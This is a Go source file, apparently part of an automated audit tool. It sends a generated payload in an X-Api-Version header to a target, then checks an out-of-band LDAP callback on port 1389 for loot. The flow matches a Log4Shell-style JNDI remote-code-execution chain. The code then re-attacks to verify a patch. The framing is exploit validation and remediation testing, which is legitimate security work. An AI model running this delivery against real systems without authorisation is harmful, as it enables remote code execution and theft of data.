package effectors

import (
	"auto-audit/internal/core"
	"auto-audit/pkg/oob"
	"fmt"
	"net/http"
	"time"
)

// ToolProber executes closed-loop exploit validation and remediation verification
type ToolProber struct{}

func (t *ToolProber) ID() string { return "prober" }

func (t *ToolProber) Execute(target string, kb *core.KnowledgeBase) string {
	kb.Mu.Lock()
	if len(kb.CustomPayloads) == 0 {
		kb.Mu.Unlock()
		return "FAILURE: Нет сгенерированных нагрузок для отправки."
	}
	payload := kb.CustomPayloads[len(kb.CustomPayloads)-1]
	kb.Mu.Unlock()

	client := &http.Client{Timeout: 3 * time.Second}

	// Scenario 1: Verification phase
	if kb.PatchApplied {
		fmt.Printf("[ЭФФЕКТОР:prober] Верификация патча: Повторная атака уязвимости на %s...\n", target)

		oob.ResetCallback()

		req, _ := http.NewRequest("GET", target, nil)
		req.Header.Set("X-Api-Version", payload)

		resp, err := client.Do(req)
		if err != nil {
			return fmt.Sprintf("FAILURE: Ошибка отправки запроса верификации: %v", err)
		}
		resp.Body.Close()

		time.Sleep(1500 * time.Millisecond)

		triggered, _ := oob.GetCallbackStatus()

		if !triggered {
			kb.Mu.Lock()
			kb.PatchVerified = true
			kb.Mu.Unlock()
			return "VERIFICATION_SUCCESS: Попытка эксплуатации отклонена сервером. Входящий TCP-коллбек на порт 1389 отсутствует. Уязвимость успешно устранена."
		}
		kb.Mu.Lock()
		kb.PatchApplied = false
		kb.Mu.Unlock()
		return "FAILURE: Патч не сработал, коллбек все еще проходит!"
	}

	// Scenario 2: Initial Exploitation
	fmt.Printf("[ЭФФЕКТОР:prober] Первичная атака: Отправка нагрузки '%s' на %s...\n", payload, target)

	oob.ResetCallback()

	req, _ := http.NewRequest("GET", target, nil)
	req.Header.Set("X-Api-Version", payload)

	resp, err := client.Do(req)
	if err != nil {
		return fmt.Sprintf("FAILURE: Ошибка отправки эксплоита: %v", err)
	}
	resp.Body.Close()

	// Wait up to 3.5 seconds for JNDI -> LDAP -> HTTP Exploit download -> RCE execution flag transmission
	for i := 0; i < 35; i++ {
		time.Sleep(100 * time.Millisecond)
		triggered, _ := oob.GetCallbackStatus()
		if triggered {
			break
		}
	}

	triggered, capturedLoot := oob.GetCallbackStatus()

	if triggered && capturedLoot != "" {
		kb.Mu.Lock()
		kb.Loot = append(kb.Loot, capturedLoot)
		kb.CurrentPhase = "Remediation"
		kb.Mu.Unlock()

		return fmt.Sprintf("SUCCESS: LDAP Callback получен на порту 1389 (Loot: %s).", capturedLoot)
	}

	return "FAILURE: Атака не удалась. Уязвимость не эксплуатирована или флаг не перехвачен."
}
